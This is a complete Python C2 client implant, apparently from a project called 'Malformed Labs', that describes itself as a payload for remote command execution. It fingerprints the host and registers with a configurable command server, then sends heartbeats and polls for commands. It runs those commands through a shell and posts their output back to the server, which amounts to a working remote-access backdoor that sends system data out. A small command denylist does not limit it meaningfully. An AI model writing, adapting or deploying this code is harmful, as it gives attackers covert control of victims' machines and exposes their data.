#!/usr/bin/env python3
"""
Malformed Labs Client Listener
A lightweight C2 client payload for remote command execution
"""

import json
import time
import socket
import subprocess
import threading
import platform
import os
import sys
from urllib.request import urlopen, Request
from urllib.error import URLError, HTTPError
import base64
import hashlib

class MalformedClient:
    def __init__(self, c2_host="localhost", c2_port=8888, client_id=None):
        self.c2_host = c2_host
        self.c2_port = c2_port
        self.client_id = client_id or self.generate_client_id()
        self.running = True
        self.heartbeat_interval = 30  # seconds
        self.command_check_interval = 5  # seconds
        
    def generate_client_id(self):
        """Generate a unique client ID based on system info"""
        hostname = platform.node()
        system = platform.system()
        machine = platform.machine()
        
        # Create a hash from system info
        system_string = f"{hostname}-{system}-{machine}"
        client_hash = hashlib.md5(system_string.encode()).hexdigest()[:8]
        return f"{hostname}-{client_hash}"
    
    def get_system_info(self):
        """Collect basic system information"""
        try:
            info = {
                "client_id": self.client_id,
                "hostname": platform.node(),
                "system": platform.system(),
                "release": platform.release(),
                "architecture": platform.machine(),
                "processor": platform.processor(),
                "python_version": platform.python_version(),
                "user": os.getenv("USER", "unknown"),
                "cwd": os.getcwd(),
                "pid": os.getpid(),
                "timestamp": int(time.time())
            }
            
            # Get IP address
            try:
                # Connect to external service to get our IP
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.connect(("8.8.8.8", 80))
                info["local_ip"] = s.getsockname()[0]
                s.close()
            except:
                info["local_ip"] = "unknown"
            
            return info
        except Exception as e:
            return {"error": str(e), "client_id": self.client_id}
    
    def execute_command(self, command, timeout=30):
        """Execute a system command with timeout"""
        try:
            if not command.strip():
                return {"success": False, "error": "Empty command"}
            
            # Security: Basic command filtering (can be expanded)
            dangerous_commands = ["rm -rf", "format", "del /f", "shutdown", "reboot", "halt"]
            if any(dangerous in command.lower() for dangerous in dangerous_commands):
                return {"success": False, "error": "Command blocked for security"}
            
            result = subprocess.run(
                command,
                shell=True,
                capture_output=True,
                text=True,
                timeout=timeout
            )
            
            return {
                "success": True,
                "exit_code": result.returncode,
                "stdout": result.stdout,
                "stderr": result.stderr,
                "command": command
            }
            
        except subprocess.TimeoutExpired:
            return {"success": False, "error": f"Command timed out after {timeout}s"}
        except Exception as e:
            return {"success": False, "error": str(e)}
    
    def send_request(self, endpoint, data=None, method="GET"):
        """Send HTTP request to C2 server"""
        try:
            url = f"http://{self.c2_host}:{self.c2_port}{endpoint}"
            
            if data:
                data = json.dumps(data).encode('utf-8')
                req = Request(url, data=data, headers={'Content-Type': 'application/json'})
                if method == "POST":
                    req.get_method = lambda: 'POST'
            else:
                req = Request(url)
            
            response = urlopen(req, timeout=10)
            return json.loads(response.read().decode('utf-8'))
            
        except (URLError, HTTPError, socket.timeout) as e:
            return {"error": f"Network error: {str(e)}"}
        except json.JSONDecodeError:
            return {"error": "Invalid JSON response"}
        except Exception as e:
            return {"error": f"Request failed: {str(e)}"}
    
    def register_client(self):
        """Register this client with the C2 server"""
        system_info = self.get_system_info()
        response = self.send_request("/api/register", system_info, "POST")
        
        if response.get("success"):
            print(f"[+] Registered with C2 server as {self.client_id}")
            return True
        else:
            print(f"[-] Registration failed: {response.get('error', 'Unknown error')}")
            return False
    
    def send_heartbeat(self):
        """Send periodic heartbeat to C2 server"""
        while self.running:
            try:
                heartbeat_data = {
                    "client_id": self.client_id,
                    "timestamp": int(time.time()),
                    "status": "alive"
                }
                
                response = self.send_request("/api/heartbeat", heartbeat_data, "POST")
                
                if not response.get("success"):
                    print(f"[-] Heartbeat failed: {response.get('error', 'Unknown')}")
                
            except Exception as e:
                print(f"[-] Heartbeat error: {e}")
            
            time.sleep(self.heartbeat_interval)
    
    def check_for_commands(self):
        """Check for pending commands from C2 server"""
        while self.running:
            try:
                response = self.send_request(f"/api/commands/{self.client_id}")
                
                if response.get("success") and response.get("commands"):
                    for cmd_data in response["commands"]:
                        command_id = cmd_data.get("id")
                        command = cmd_data.get("command")
                        
                        print(f"[*] Executing command: {command}")
                        
                        # Execute the command
                        result = self.execute_command(command)
                        
                        # Send result back to C2
                        result_data = {
                            "client_id": self.client_id,
                            "command_id": command_id,
                            "result": result
                        }
                        
                        self.send_request("/api/results", result_data, "POST")
                        
            except Exception as e:
                print(f"[-] Command check error: {e}")
            
            time.sleep(self.command_check_interval)
    
    def start(self):
        """Start the client listener"""
        print(f"[*] Starting Malformed Labs Client Listener")
        print(f"[*] Client ID: {self.client_id}")
        print(f"[*] C2 Server: {self.c2_host}:{self.c2_port}")
        
        # Register with C2 server
        if not self.register_client():
            print("[-] Failed to register with C2 server, continuing anyway...")
        
        # Start background threads
        heartbeat_thread = threading.Thread(target=self.send_heartbeat, daemon=True)
        command_thread = threading.Thread(target=self.check_for_commands, daemon=True)
        
        heartbeat_thread.start()
        command_thread.start()
        
        try:
            print("[+] Client listener active. Press Ctrl+C to stop.")
            while self.running:
                time.sleep(1)
        except KeyboardInterrupt:
            print("\n[-] Stopping client listener...")
            self.running = False
    
    def stop(self):
        """Stop the client listener"""
        self.running = False


def main():
    """Main entry point"""
    # Configuration - these can be set via command line or environment
    c2_host = os.getenv("C2_HOST", "localhost")
    c2_port = int(os.getenv("C2_PORT", "8888"))
    client_id = os.getenv("CLIENT_ID", None)
    
    # Parse command line arguments
    if len(sys.argv) > 1:
        c2_host = sys.argv[1]
    if len(sys.argv) > 2:
        c2_port = int(sys.argv[2])
    if len(sys.argv) > 3:
        client_id = sys.argv[3]
    
    # Create and start client
    client = MalformedClient(c2_host, c2_port, client_id)
    client.start()


if __name__ == "__main__":
    main()